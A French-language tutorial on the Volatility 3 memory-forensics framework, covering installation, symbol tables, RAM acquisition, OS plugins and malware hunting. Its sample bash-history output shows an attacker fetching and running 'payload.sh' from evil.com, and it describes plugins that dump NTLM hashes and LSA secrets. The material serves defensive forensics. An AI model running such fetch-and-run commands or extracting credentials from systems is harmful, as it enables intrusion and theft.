# Tutoriel complet Volatility 3 — Analyse forensique de la mémoire vive

> **Volatility** est **le framework open source de référence mondiale** pour l'extraction d'artefacts numériques depuis des dumps de **mémoire volatile (RAM)**. Développé depuis 2007 par la **Volatility Foundation**, il permet de reconstituer l'état d'exécution d'un système (processus actifs, connexions réseau, code injecté, mots de passe en clair, clés de chiffrement…) à partir d'une simple image mémoire.
>
> **Volatility 3** est la **réécriture complète** du framework, sortie en **2019**, modernisée en Python 3 et conçue pour la performance et la maintenabilité à long terme.
>
> Dépôt officiel : <https://github.com/volatilityfoundation/volatility3>
> Documentation : <https://volatility3.readthedocs.io>
> Site officiel : <https://www.volatilityfoundation.org>
> Licence : **VSL v1.0** (Volatility Software License)
> Version stable actuelle : **2.27.0** (janvier 2026)

---

## Table des matières

1. [Présentation générale](#1-présentation-générale)
2. [Volatility 2 vs Volatility 3](#2-volatility-2-vs-volatility-3)
3. [Cas d'usage typiques](#3-cas-dusage-typiques)
4. [Architecture du framework](#4-architecture-du-framework)
5. [Prérequis système](#5-prérequis-système)
6. [Installation sous Linux/macOS](#6-installation-sous-linuxmacos)
7. [Installation sous Windows](#7-installation-sous-windows)
8. [Installation des Symbol Tables](#8-installation-des-symbol-tables)
9. [Acquisition d'un dump mémoire](#9-acquisition-dun-dump-mémoire)
10. [Premier workflow : analyse d'un dump Windows](#10-premier-workflow--analyse-dun-dump-windows)
11. [Plugins Windows essentiels](#11-plugins-windows-essentiels)
12. [Plugins Linux essentiels](#12-plugins-linux-essentiels)
13. [Plugins macOS essentiels](#13-plugins-macos-essentiels)
14. [Chasse au malware avec Volatility](#14-chasse-au-malware-avec-volatility)
15. [volshell : exploration interactive](#15-volshell--exploration-interactive)
16. [Intégration avec d'autres outils](#16-intégration-avec-dautres-outils)
17. [Forces de Volatility 3](#17-forces-de-volatility-3)
18. [Faiblesses et limites](#18-faiblesses-et-limites)
19. [Bonnes pratiques](#19-bonnes-pratiques)
20. [Ressources utiles](#20-ressources-utiles)

---

## 1. Présentation générale

La **mémoire vive (RAM)** d'un système contient des **trésors forensiques** invisibles sur le disque :

- Processus en cours d'exécution (y compris malware fileless)
- Connexions réseau actives
- Mots de passe et clés de chiffrement en clair
- Commandes tapées au terminal/PowerShell
- Code injecté dans des processus légitimes
- Données déchiffrées de fichiers protégés
- Contenu du presse-papier
- Communications instantanées non sauvegardées

**Volatility** est l'outil qui transforme une image RAM brute (un fichier `.raw`, `.mem`, `.vmem`, `.dmp`…) en une analyse exploitable.

C'est **l'outil standard de l'industrie DFIR** depuis plus de 15 ans. Il est utilisé par :

- Les **CERT/CSIRT** du monde entier
- Le **FBI**, la **NSA**, l'**ANSSI** et les services de renseignement
- Les **grandes entreprises** pour la chasse aux malwares
- Les **équipes red/blue team** en formation et en exercice
- Les **chercheurs académiques** en sécurité

Statistiques GitHub (fin 2025) : ~**4 000 étoiles**, 78 contributeurs, version **2.27.0** sortie en janvier 2026.

---

## 2. Volatility 2 vs Volatility 3

| Aspect | Volatility 2 | Volatility 3 |
|--------|--------------|--------------|
| **Langage** | Python 2 (déprécié) | **Python 3.8+** |
| **Configuration** | Nécessite `--profile` (ex. Win7SP1x64) | **Détection automatique** |
| **Performance** | Lent sur gros dumps | **Beaucoup plus rapide** |
| **Symbol tables** | Profiles intégrés | **ISF JSON téléchargés** |
| **Maintenance** | **Arrêtée** depuis 2020 | **Active** |
| **Plugins** | Très nombreux (200+) | En croissance, certains à porter |
| **Syntaxe** | `vol.py --profile=Win7SP1x64 -f mem.raw pslist` | `vol -f mem.raw windows.pslist` |

> ⚠️ **Recommandation** : tous les nouveaux projets doivent utiliser **Volatility 3**. Vol2 ne reçoit plus de mises à jour et ne supporte pas Windows 10/11 récents. Toutefois, certains plugins de niche (par exemple anciens dumps Windows XP) ne sont **pas encore portés** vers Vol3 — dans ces rares cas, Vol2 reste utile.

---

## 3. Cas d'usage typiques

- **Réponse à incident** : analyse rapide d'un poste compromis avant qu'il ne soit éteint.
- **Chasse au malware sans fichier** (*fileless malware*) : Cobalt Strike, Meterpreter, PowerShell Empire, etc.
- **Détection d'injection de code** dans des processus légitimes (Process Hollowing, Process Doppelgänging, DLL injection).
- **Récupération de mots de passe** depuis LSASS, le SAM Windows ou les caches.
- **Reconstruction d'activité utilisateur** (commandes tapées, sites visités, conversations).
- **Analyse de ransomware** : trouver la clé de chiffrement en mémoire.
- **Détection de rootkits** : hooks SSDT, IRP, IDT, IAT/EAT.
- **Analyse de VM** : exploitation directe des snapshots `.vmem`/`.vmss`.
- **CTF et challenges** : Volatility est omniprésent dans les compétitions DFIR.

---

## 4. Architecture du framework

Volatility 3 repose sur **4 concepts clés** :

```
┌─────────────────────────────────────────────────────┐
│                                                     │
│   IMAGE MÉMOIRE (.raw, .vmem, .dmp, lime…)          │
│              │                                      │
│              ▼                                      │
│   ┌──────────────────────┐                          │
│   │  LAYERS (couches)    │  ← lecture brute,        │
│   │                      │    désempaqueter         │
│   │  RawMemoryLayer,     │    LIME, EWF, etc.       │
│   │  WindowsCrashDump,   │                          │
│   │  Intel32, Intel64    │                          │
│   └──────────┬───────────┘                          │
│              │                                      │
│              ▼                                      │
│   ┌──────────────────────┐                          │
│   │  SYMBOL TABLES (ISF) │  ← descriptions de       │
│   │  Windows 11 build X, │    structures du noyau   │
│   │  Linux kernel Y,     │    (offsets, types)      │
│   │  macOS Z             │                          │
│   └──────────┬───────────┘                          │
│              │                                      │
│              ▼                                      │
│   ┌──────────────────────┐                          │
│   │  PLUGINS             │  ← logique d'analyse :   │
│   │  windows.pslist,     │    parcours des          │
│   │  windows.malfind,    │    structures du noyau   │
│   │  linux.psaux, etc.   │    pour extraire         │
│   └──────────┬───────────┘    des artefacts         │
│              │                                      │
│              ▼                                      │
│         Sortie texte/JSON/CSV                       │
│                                                     │
└─────────────────────────────────────────────────────┘
```

| Composant | Rôle |
|-----------|------|
| **Layers** | Couches d'abstraction pour lire l'image mémoire (RAW, crashdump, VMware, LIME…) |
| **Symbol Tables (ISF)** | Fichiers JSON décrivant les structures du noyau pour une version d'OS donnée |
| **Plugins** | Modules d'analyse spécialisés (pslist, malfind, netstat…) |
| **Renderers** | Formats de sortie (texte tabulaire, JSON, CSV, HTML) |

Cette architecture **modulaire** permet d'ajouter facilement le support de nouveaux OS, formats de dump et types d'analyses.

---

## 5. Prérequis système

### Matériel

| Composant | Minimum | Recommandé |
|-----------|---------|------------|
| RAM | 4 Go | **16 Go** (Volatility charge le dump en mémoire) |
| CPU | 2 cœurs | 4+ cœurs (certains plugins parallélisables) |
| Stockage | 20 Go libres | SSD pour le cache des symboles |
| OS | Linux/Windows/macOS | Linux Ubuntu/Debian |

> 💡 Règle de pouce : avoir **au moins autant de RAM que la taille du dump** pour un fonctionnement fluide.

### Logiciels

- **Python 3.8 ou supérieur** (3.10+ recommandé)
- **pip** ou **pipx**
- **git** (pour version dev)
- Compilateur C (rarement, pour certaines dépendances natives)

---

## 6. Installation sous Linux/macOS

### Méthode 1 : pip (la plus simple)

```bash
# Crée un environnement virtuel (recommandé)
python3 -m venv vol3_env
source vol3_env/bin/activate

# Installe Volatility 3 avec toutes les dépendances optionnelles
pip install volatility3
```

> 💡 Pour bénéficier de **toutes les fonctionnalités** (YARA, support de formats étendus, etc.) :
> ```bash
> pip install "volatility3[full]"
> ```

### Méthode 2 : pipx (isolé global)

```bash
pipx install volatility3
```

### Méthode 3 : depuis les sources (dernière version dev)

```bash
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
python3 -m venv venv && source venv/bin/activate
pip install -e ".[dev]"
```

### Vérifier l'installation

```bash
vol --version
vol -h
```

Tu dois voir la liste des plugins disponibles. Le binaire est `vol` (et son alias historique `vol.py` reste disponible).

### Sous Kali Linux

Volatility 3 est packagé :

```bash
sudo apt update
sudo apt install volatility3
```

---

## 7. Installation sous Windows

### Méthode 1 : pip dans PowerShell

```powershell
# Installer Python 3.10+ depuis python.org au préalable
python -m venv vol3_env
.\vol3_env\Scripts\Activate.ps1
pip install volatility3
vol --version
```

### Méthode 2 : binaires précompilés

La Volatility Foundation distribue des **exécutables Windows autonomes** sur la page Releases :

1. <https://github.com/volatilityfoundation/volatility3/releases>
2. Télécharger `vol-X.Y.Z.exe` (pas besoin de Python installé).
3. Placer dans un dossier ajouté au `PATH`.

### Méthode 3 : WSL2

Installer **WSL2 + Ubuntu**, puis suivre la procédure Linux. Recommandé si tu fais déjà beaucoup de DFIR sous Linux.

---

## 8. Installation des Symbol Tables

Volatility a **besoin de fichiers de symboles** (au format **ISF — Intermediate Symbol File**) pour interpréter les structures du noyau de chaque version d'OS.

### Téléchargement des packs officiels

```bash
# Localiser le dossier symbols de l'installation
python3 -c "import volatility3; print(volatility3.__file__)"
# Exemple : /home/user/vol3_env/lib/python3.10/site-packages/volatility3/__init__.py
# → Dossier symbols : .../volatility3/symbols/

# Télécharger les packs (depuis le dossier symbols/)
wget https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip
wget https://downloads.volatilityfoundation.org/volatility3/symbols/mac.zip
wget https://downloads.volatilityfoundation.org/volatility3/symbols/linux.zip

# Décompresser DANS le dossier symbols/, en gardant les noms
# Les zip doivent rester nommés tels quels (windows.zip, mac.zip, linux.zip)
```

> ⚠️ **Premier lancement** : Volatility va indexer tous les symboles, ce qui peut prendre **5 à 30 minutes**. Ce n'est fait qu'une seule fois. Le processus peut être interrompu et reprendra automatiquement.

### Symboles Windows : téléchargement automatique

Pour **Windows**, Volatility peut **télécharger automatiquement** les symboles depuis Microsoft Symbol Server lors de l'analyse — y compris pour les versions de Windows non incluses dans le pack standard. Aucune action manuelle nécessaire en général.

### Symboles Linux et macOS : à générer

Pour Linux et macOS, les symboles doivent être **générés manuellement** depuis les fichiers DWARF du noyau analysé, via l'outil [**dwarf2json**](https://github.com/volatilityfoundation/dwarf2json) :

```bash
# Linux : générer ISF depuis vmlinux + System.map
git clone https://github.com/volatilityfoundation/dwarf2json.git
cd dwarf2json
go build
./dwarf2json linux --elf /path/to/vmlinux --system-map /path/to/System.map > ubuntu_22.04.json

# Placer le JSON dans symbols/linux/
mv ubuntu_22.04.json .../volatility3/symbols/linux/
```

> 💡 Pourquoi cette différence ? Il existe des **dizaines de millions** de combinaisons de noyaux Linux (chaque distribution, chaque mise à jour génère un nouveau kernel) — impossible de tous les pré-générer.

### Vérifier les symboles disponibles

```bash
vol -f mem.raw isfinfo.IsfInfo
```

Liste tous les fichiers ISF actuellement chargés.

---

## 9. Acquisition d'un dump mémoire

Volatility **n'acquiert pas** la mémoire — il faut un outil tiers en amont. Voici les principaux :

### Windows

| Outil | Type | Recommandation |
|-------|------|----------------|
| **FTK Imager** | GUI, gratuit, AccessData | ✅ Standard judiciaire, mais empreinte mémoire un peu lourde |
| **Magnet RAM Capture** | GUI, gratuit | ✅ Léger et fiable |
| **WinPmem** | CLI, open source (Velocidex) | ✅ Sortie `.raw` ou crashdump, intègre bien avec Volatility |
| **DumpIt** (Comae) | CLI, gratuit | ✅ Ultra-léger (~2 Mo), un seul exe |
| **Belkasoft RAM Capturer** | GUI, gratuit | ✅ Kernel-mode, contourne anti-debug |

**Exemple avec WinPmem** :

```cmd
:: Lancement en administrateur
winpmem_v4.0.rc1.exe -o E:\dump\memory.raw
```

> ⚠️ **Toujours dumper vers un support externe** (USB rapide, disque externe) pour ne pas modifier le disque local.

### Linux

| Outil | Description |
|-------|-------------|
| **LiME** | Loadable Kernel Module — sortie au format `.lime` ou raw |
| **AVML** (Microsoft) | Binaire statique Rust en userland, ne nécessite pas de module noyau |
| **/proc/kcore** | Lecture directe (Linux) — moins fiable |

**Exemple avec AVML** :

```bash
sudo ./avml memory.lime
```

### macOS

L'acquisition de RAM sous macOS récents est **très difficile** à cause de SIP (System Integrity Protection). Outils historiques : **OSXPmem** (plus maintenu), **Volexity Surge** (commercial).

### Machines virtuelles

**La méthode la plus propre** : utiliser les snapshots du hyperviseur :

| Hyperviseur | Fichier mémoire |
|-------------|-----------------|
| **VMware** | `.vmem` (RAM brute) ou `.vmss`/`.vmsn` (état suspendu) |
| **VirtualBox** | `.sav` (à convertir) |
| **Hyper-V** | `.bin` ou checkpoint |
| **QEMU/KVM** | `virsh save` produit un dump |

Volatility lit nativement les `.vmem` VMware.

### Hibernation et crash dumps

| Fichier | Source | Note |
|---------|--------|------|
| `hiberfil.sys` | Hibernation Windows | Contient un snapshot de la RAM au moment de l'hibernation |
| `pagefile.sys` | Fichier d'échange Windows | Données partiellement écrites depuis la RAM |
| `MEMORY.DMP` | Crash dump Windows | Selon configuration |
| `vmcore` | Crash kernel Linux | kdump |

Volatility 3 peut lire tous ces formats directement.

---

## 10. Premier workflow : analyse d'un dump Windows

### Étape 1 : vérifier le dump et détecter l'OS

```bash
vol -f memory.raw windows.info
```

Sortie typique :

```
Variable        Value
Kernel Base     0xf80042200000
DTB             0x1ab000
Symbols         file:///path/to/symbols/...
Is64Bit         True
IsPAE           False
PrimaryProcessorIndex   0
NTBuildLab      19041.1.amd64fre.vb_release.191206-1406
NTProductType   NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Sat Dec  7 09:23:14 2019
```

→ C'est un Windows 10 build 19041 (version 2004), 64-bit.

### Étape 2 : lister les processus

```bash
vol -f memory.raw windows.pslist
```

### Étape 3 : arbre hiérarchique des processus

```bash
vol -f memory.raw windows.pstree
```

→ Permet de repérer les processus dont le parent est suspect (ex : `cmd.exe` lancé par `winword.exe` = exécution macro malveillante).

### Étape 4 : connexions réseau

```bash
vol -f memory.raw windows.netstat
vol -f memory.raw windows.netscan
```

### Étape 5 : chercher du code injecté

```bash
vol -f memory.raw windows.malfind
```

### Étape 6 : timeline globale

```bash
vol -f memory.raw timeliner.Timeliner --output csv > timeline.csv
```

Importable dans Plaso/Timesketch pour corrélation avec le disque.

### Sauvegarder les sorties

```bash
# Sortie en fichier
vol -f memory.raw windows.pslist > pslist.txt

# Sortie JSON pour traitement automatisé
vol -f memory.raw --renderer json windows.pslist > pslist.json

# Sortie CSV
vol -f memory.raw --renderer csv windows.pslist > pslist.csv
```

---

## 11. Plugins Windows essentiels

### Processus et exécution

| Plugin | Rôle |
|--------|------|
| `windows.info` | Informations système et version Windows |
| `windows.pslist` | Liste les processus via la `EPROCESS` linked list |
| `windows.psscan` | Scan exhaustif (trouve même les processus cachés/terminés) |
| `windows.pstree` | Arbre parent-enfant |
| `windows.psxview` | **Compare** plusieurs méthodes de listing → détecte le caching |
| `windows.cmdline` | Ligne de commande de chaque processus |
| `windows.dlllist` | DLL chargées par processus |
| `windows.handles` | Handles (fichiers, registre, mutex…) |
| `windows.envars` | Variables d'environnement |
| `windows.privileges` | Privilèges actifs des tokens processus |
| `windows.sessions` | Sessions utilisateur actives |
| `windows.getsids` | SIDs associés aux processus |

### Réseau

| Plugin | Rôle |
|--------|------|
| `windows.netstat` | Connexions TCP/UDP actives |
| `windows.netscan` | Scan exhaustif des structures réseau |

### Système de fichiers

| Plugin | Rôle |
|--------|------|
| `windows.filescan` | Scan des `FILE_OBJECT` en mémoire |
| `windows.dumpfiles` | Extrait des fichiers identifiés |
| `windows.mftscan.MFTScan` | Reconstruit la MFT depuis la mémoire |

### Registre Windows

| Plugin | Rôle |
|--------|------|
| `windows.registry.hivelist` | Liste les ruches chargées |
| `windows.registry.printkey` | Affiche une clé/valeur |
| `windows.registry.hivescan` | Scan exhaustif des ruches |
| `windows.registry.userassist` | Programmes exécutés (UserAssist) |
| `windows.registry.shimcachemem` | ShimCache (programmes exécutés) |
| `windows.amcache` | AmCache (programmes installés/exécutés) |

### Credentials

| Plugin | Rôle |
|--------|------|
| `windows.hashdump` | **Hashes NTLM du SAM** (cassables avec hashcat) |
| `windows.lsadump` | Secrets LSA (mots de passe en clair éventuels) |
| `windows.cachedump` | Hashes mis en cache (logon offline) |

### Drivers et noyau

| Plugin | Rôle |
|--------|------|
| `windows.modules` | Liste les drivers chargés |
| `windows.driverscan` | Scan exhaustif des drivers |
| `windows.devicetree` | Arbre des devices |
| `windows.ssdt` | SSDT (System Service Descriptor Table) |
| `windows.callbacks` | Callbacks kernel |

### Activité utilisateur

| Plugin | Rôle |
|--------|------|
| `windows.userhandles` | Handles par utilisateur |
| `windows.cmdscan` / `windows.consoles` | Commandes tapées dans cmd.exe |
| `windows.clipboard` | Contenu du presse-papier |

> 💡 **Astuce** : pour voir **tous** les plugins disponibles, lance simplement `vol -h` et fais défiler. Il y en a plus de **150**.

---

## 12. Plugins Linux essentiels

L'analyse Linux nécessite d'avoir **généré le symbol pack** via `dwarf2json` pour le kernel exact du système analysé.

| Plugin | Rôle |
|--------|------|
| `linux.psaux` | Processus + arguments en ligne de commande |
| `linux.pslist` | Liste les processus |
| `linux.pstree` | Arbre parent-enfant |
| `linux.psscan` | Scan exhaustif (processus cachés) |
| `linux.bash` | **Historique bash** des utilisateurs |
| `linux.lsof` | Fichiers ouverts |
| `linux.lsmod` | Modules noyau chargés |
| `linux.ip.Addr` | Adresses IP par interface |
| `linux.ip.Link` | Interfaces réseau |
| `linux.malfind` | Détection de code injecté |
| `linux.elfs` | Fichiers ELF mappés en mémoire |
| `linux.mount` | Points de montage |
| `linux.tty_check` | Hooks suspects sur TTY (keylogger) |
| `linux.keyboard_notifiers` | Notifiers clavier malveillants |
| `linux.check_modules` | Modules cachés (rootkits) |
| `linux.check_idt` | Vérifie l'IDT (Interrupt Descriptor Table) |
| `linux.envars` | Variables d'environnement |

### Exemple : retrouver l'historique bash d'un attaquant

```bash
vol -f linux_memory.raw linux.bash
```

Sortie typique :

```
PID    Process    CommandTime              Command
1234   bash       2026-01-15 14:23:45      curl http://evil.com/payload.sh
1234   bash       2026-01-15 14:24:01      chmod +x payload.sh
1234   bash       2026-01-15 14:24:08      ./payload.sh
```

**Or en clair**.

---

## 13. Plugins macOS essentiels

| Plugin | Rôle |
|--------|------|
| `mac.pslist` | Liste les processus |
| `mac.pstree` | Arbre parent-enfant |
| `mac.psaux` | Arguments en ligne de commande |
| `mac.lsof` | Fichiers ouverts |
| `mac.lsmod` | Modules kernel |
| `mac.netstat` | Connexions réseau |
| `mac.malfind` | Code injecté |
| `mac.bash` | Historique bash/zsh |
| `mac.mount` | Points de montage |
| `mac.dmesg` | Buffer log noyau |
| `mac.envars` | Variables d'environnement |
| `mac.timers` | Timers kernel suspects |
| `mac.trustedbsd` | Modules TrustedBSD malveillants |
| `mac.socket_filters` | Filtres socket kernel |

> ⚠️ macOS est **historiquement moins bien supporté** que Windows et Linux à cause de la fermeture progressive d'Apple (SIP, kernel non publié en source complète).

---

## 14. Chasse au malware avec Volatility

Volatility 3 dispose d'un **sous-package dédié à la détection de malware** : `windows.malware.*`.

| Plugin | Détection |
|--------|-----------|
| `windows.malfind` | Code injecté (RWX heap sans backing file) |
| `windows.hollowprocesses` | **Process Hollowing** (PEB falsifié) |
| `windows.processghosting` | **Process Ghosting** (fichier supprimé en mémoire) |
| `windows.malware.psxview` | Compare 7 méthodes de listing → caches |
| `windows.malware.suspicious_threads` | Threads suspects en zone userland |
| `windows.malware.skeleton_key_check` | Détection Skeleton Key (compromission AD) |
| `windows.malware.unhooked_system_calls` | Syscalls déshookés (anti-EDR) |
| `windows.malware.svcdiff` | Services injectés ou modifiés |
| `windows.malware.pebmasquerade` | Falsification du PEB |
| `windows.svcscan` | Services Windows (anciens et nouveaux) |
| `yarascan.YaraScan` | Recherche par règles **YARA** |

### Exemple : malfind + dump du code injecté

```bash
# Identifier les processus avec code injecté
vol -f memory.raw windows.malfind

# Dumper la mémoire d'un processus suspect (PID 4567)
vol -f memory.raw -o /tmp/dump windows.memmap --pid 4567 --dump

# Dumper l'exécutable PE complet
vol -f memory.raw -o /tmp/dump windows.dumpfiles --pid 4567
```

### Exemple : recherche YARA

```bash
# Avec règles dans un fichier
vol -f memory.raw yarascan.YaraScan --yara-rules /opt/rules/cobaltstrike.yar

# Avec une règle inline
vol -f memory.raw yarascan.YaraScan --yara-string "mimikatz"
```

### Workflow type de chasse

1. **`windows.info`** → identifier l'OS et confirmer l'intégrité du dump
2. **`windows.pstree`** → chercher des processus suspects (mauvais parent, nom obfusqué)
3. **`windows.cmdline`** → examiner les arguments (URLs, base64, PowerShell encoded)
4. **`windows.malfind`** → repérer les injections
5. **`windows.netscan`** → IPs externes suspectes
6. **`windows.hollowprocesses`** + **`windows.processghosting`** → techniques avancées
7. **`yarascan`** avec règles publiques → corrélation IoC
8. **Dump** des processus suspects pour analyse statique (avec `dumpfiles` ou `memmap --dump`)

---

## 15. volshell : exploration interactive

`volshell` est un **REPL Python interactif** qui permet d'explorer un dump comme on explorerait un système live. C'est l'outil indispensable des analystes expérimentés et des développeurs de plugins.

### Lancement

```bash
volshell -f memory.raw

# Forcer un OS spécifique
volshell -w -f memory.raw   # Windows
volshell -l -f memory.raw   # Linux
volshell -m -f memory.raw   # macOS
```

### Exemples de commandes interactives

```python
# Lister les processus
>>> ps()

# Changer de contexte processus
>>> cc(pid=1234)

# Lire la mémoire à une adresse
>>> hh(0x7ff6_3000_0000, 256)   # hexdump 256 octets

# Naviguer dans une structure
>>> proc = list(ps())[0]
>>> proc.UniqueProcessId
>>> proc.ImageFileName.cast("string", max_length=15)

# Désassembler à une adresse
>>> dis(0x7ff6_3000_0000)
```

C'est extrêmement puissant pour aller au-delà des plugins prédéfinis.

---

## 16. Intégration avec d'autres outils

### Plaso (super-timeline)

Le plugin `timeliner.Timeliner` génère un body file compatible avec Plaso/log2timeline :

```bash
vol -f memory.raw --renderer csv timeliner.Timeliner > mem_body.csv
```

Puis injection dans la timeline Plaso :
```bash
log2timeline --parsers mactime --storage-file case.plaso mem_body.csv
```

> ⚠️ Comme noté dans le tutoriel Plaso : le format Volatility3 body file demande parfois un **reformatage manuel** pour être ingéré sans erreur par Plaso (issue [#542](https://github.com/volatilityfoundation/volatility3/issues/542)).

### YARA

Volatility 3 inclut le plugin `yarascan` pour appliquer des **règles YARA** sur l'image mémoire entière ou sur des processus spécifiques :

```bash
vol -f memory.raw yarascan.YaraScan --yara-rules rules.yar --pid 1234
```

### Sigma rules (via Timesketch)

Une fois la timeline générée et injectée dans **Timesketch**, on peut appliquer des **Sigma rules** pour automatiser la détection de patterns malveillants.

### Bulk_extractor

Si `windows.netscan` est instable (notamment sur d'anciens builds Windows), **bulk_extractor** est une alternative pour extraire un fichier `.pcap` directement depuis la mémoire :

```bash
bulk_extractor -o output/ memory.raw
```

### IPED / Autopsy

Aucun lien direct, mais le workflow professionnel combine :

1. **IPED ou Autopsy** pour le disque
2. **Volatility 3** pour la RAM
3. **Plaso + Timesketch** pour fusionner les deux timelines
4. **YARA + Sigma** pour la détection automatique

---

## 17. Forces de Volatility 3

✅ **Standard de facto mondial** pour l'analyse de RAM. **Aucun équivalent open source à ce niveau**.

✅ **Multi-plateforme** : analyse Windows, Linux, macOS depuis n'importe quel poste analyste.

✅ **Multi-format** : RAW, LIME, crashdump, VMware `.vmem`/`.vmss`, hiberfil.sys, EWF, etc.

✅ **Détection automatique de l'OS** : plus besoin de spécifier un profile comme dans Vol2 — gain de temps énorme.

✅ **Architecture modulaire** : extensible facilement en Python (plugins tiers, ISF customs).

✅ **150+ plugins prêts à l'emploi**, couvrant processus, réseau, registre, credentials, malware, kernel.

✅ **Sous-package `windows.malware.*`** spécialisé dans la chasse au malware avancé (Process Hollowing, Ghosting, etc.).

✅ **volshell** : exploration interactive Python du dump, parfaite pour les analystes confirmés.

✅ **Communauté DFIR active** : Slack officiel, blog `volatility-labs.blogspot.com`, conférences (OMFW — Open Memory Forensics Workshop).

✅ **Documentation Read the Docs** complète : <https://volatility3.readthedocs.io>

✅ **Téléchargement automatique des symboles Windows** depuis Microsoft Symbol Server — transparent pour l'utilisateur.

✅ **Plusieurs renderers** (texte, JSON, CSV, HTML) pour intégration dans des pipelines.

✅ **Performances grandement améliorées** par rapport à Vol2 sur les dumps modernes (>16 Go).

✅ **Référence judiciaire** : utilisé et reconnu dans les expertises forensiques officielles dans de nombreux pays.

✅ **Gratuit**, contrairement aux alternatives commerciales comme **Volexity Volcano**, **Magnet AXIOM Cyber** ou **F-Response**.

✅ **Inclus par défaut** dans **Kali**, **SIFT Workstation**, **REMnux**, **Tsurugi**, **CSI Linux**, etc.

✅ **Fondation à but non lucratif** (Volatility Foundation) → pérennité du projet.

---

## 18. Faiblesses et limites

❌ **Licence VSL non standard** : la **Volatility Software License v1.0** n'est ni Apache ni GPL — certaines entreprises strictes sur les licences open source (CNCF, FSF…) la considèrent comme non conforme. Vérifier la compatibilité juridique avant intégration en produit commercial.

❌ **Plugins Vol2 non tous portés** : malgré 6 ans depuis la sortie de Vol3, **certains plugins de niche** (notamment Windows XP/Vista, certaines versions Linux exotiques) **n'ont pas d'équivalent**. Il faut parfois retomber sur Vol2.

❌ **Génération des symboles Linux/macOS complexe** : nécessite `dwarf2json` + accès au `vmlinux` + `System.map` exacts du système analysé → quasi impossible si on n'a pas un accès simultané à la machine source.

❌ **Performance dégradée sur très gros dumps** (>64 Go) : peut prendre plusieurs heures sur certains plugins comme `psscan` ou `filescan`.

❌ **Premier lancement long** : l'indexation initiale du pack de symboles prend 5-30 minutes — déconcertant pour un nouvel utilisateur qui pense que l'outil a planté.

❌ **Aucune interface graphique officielle** : tout en CLI. Pour une visualisation, il faut passer par des outils tiers comme **Volexity Volcano** (commercial) ou des wrappers web maison.

❌ **Stabilité variable de `netstat`** sur les anciens Windows : nécessite parfois de basculer vers `netscan` ou bulk_extractor.

❌ **Pas d'acquisition mémoire intégrée** : il faut **toujours** un outil tiers (FTK Imager, WinPmem, LiME…) pour produire le dump.

❌ **Faux positifs fréquents** sur `malfind` : du code légitime (JIT JavaScript, .NET, antivirus eux-mêmes) lève le plugin. **Interprétation experte indispensable**.

❌ **Symboles macOS limités** : Apple ne publie plus les symboles complets du kernel depuis macOS Big Sur → support fragmenté.

❌ **Courbe d'apprentissage forte** : il faut comprendre les **structures internes** de l'OS (EPROCESS, ETHREAD, VAD, etc.) pour interpréter correctement les sorties.

❌ **Dépendance à la fraîcheur des symboles** : un Windows fraîchement patché peut ne pas avoir ses symboles disponibles → Volatility doit aller les télécharger depuis Microsoft, ce qui suppose une connexion internet (problème en environnement air-gapped).

❌ **Pas de support natif des dumps Android et iOS** : pour le mobile, il faut utiliser des outils dédiés (LiME pour Android, et MVT pour la forensique iOS, qui n'analyse pas la RAM).

❌ **Concurrence commerciale agressive** : **Volexity Volcano** (commercial, fait par les créateurs d'origine de Volatility) propose une expérience nettement plus polie et performante, ce qui pose la question du futur de Vol3 open source.

❌ **Quelques bugs sur Windows 11 récents** : les builds très récents de Windows 11 (24H2+) demandent parfois des **symboles non encore publiés**.

---

## 19. Bonnes pratiques

🔹 **Acquérir la RAM AVANT toute autre opération** sur un système suspect — c'est le plus volatile.

🔹 **Toujours dumper vers un support externe** (USB, disque externe) — ne jamais écrire sur le disque local.

🔹 **Calculer le hash SHA-256** du dump immédiatement après acquisition et documenter avec horodatage.

🔹 **Documenter le contexte** : modèle de la machine, version OS, RAM totale, outil d'acquisition utilisé, opérateur, date/heure.

🔹 **Travailler toujours sur une copie** du dump, jamais sur l'original.

🔹 **Commencer par `windows.info` / `linux.info` / `mac.info`** pour valider la lecture du dump.

🔹 **Lancer plusieurs plugins de scan complémentaires** : `pslist` (rapide) ET `psscan` (exhaustif) ET `psxview` (anti-évasion) — un rootkit peut tromper l'un mais pas tous.

🔹 **Sauvegarder toutes les sorties** dans un dossier dédié au cas (préférer JSON pour réutilisation ultérieure).

🔹 **Utiliser le mode JSON** pour pipeliner :
```bash
vol -f mem.raw --renderer json windows.pslist | jq '.[] | select(.ImageFileName | contains("notepad"))'
```

🔹 **Conserver le cache de symboles** entre cas — cela évite la réindexation.

🔹 **Pour Linux**, **toujours générer les symboles dès l'acquisition**, tant qu'on a accès à la machine source. Plus tard, ce sera impossible.

🔹 **Combiner les sorties Volatility avec la timeline disque Plaso** pour corréler événements RAM et événements disque.

🔹 **Activer YARA dès la première passe** avec des règles publiques (CobaltStrikeParser, ELASTIC, REVERSING LABS) — détection rapide d'IoCs connus.

🔹 **Pour les VMs**, **privilégier les snapshots hyperviseur** (`.vmem`/`.vmss`) plutôt qu'une acquisition depuis l'OS invité — pas d'empreinte de l'outil dans le dump.

🔹 **Utiliser `volshell`** quand un plugin existant ne couvre pas exactement ton besoin — c'est plus rapide que de coder un plugin complet.

🔹 **Faire du pre-triage avec `windows.malware.psxview`** : il combine plusieurs méthodes de détection et révèle vite les anomalies.

🔹 **Sauvegarder l'environnement Python** (`pip freeze > requirements.txt`) si tu travailles sur un cas judiciaire — pour reproduire exactement les résultats des années plus tard.

🔹 **Mettre à jour Volatility 3 trimestriellement** mais **pinner la version** lors d'un cas judiciaire (`pip install volatility3==2.27.0`).

🔹 **Se former** : la lecture de [*The Art of Memory Forensics*](https://www.memoryanalysis.net/amf) (livre des créateurs de Volatility) est quasi obligatoire pour comprendre vraiment l'outil.

---

## 20. Ressources utiles

### Officielles

- 📚 **Dépôt GitHub Volatility 3** : <https://github.com/volatilityfoundation/volatility3>
- 📚 **Documentation Read the Docs** : <https://volatility3.readthedocs.io>
- 📚 **Site officiel Volatility Foundation** : <https://www.volatilityfoundation.org>
- 📚 **Blog Volatility Labs** : <https://volatility-labs.blogspot.com>
- 📚 **Symbol packs officiels** : <https://downloads.volatilityfoundation.org/volatility3/symbols/>
- 📚 **dwarf2json** (génération symboles Linux/macOS) : <https://github.com/volatilityfoundation/dwarf2json>
- 💬 **Slack officiel** : <https://www.volatilityfoundation.org/slack>
- 🐦 **Twitter** : [@volatility](https://twitter.com/volatility)

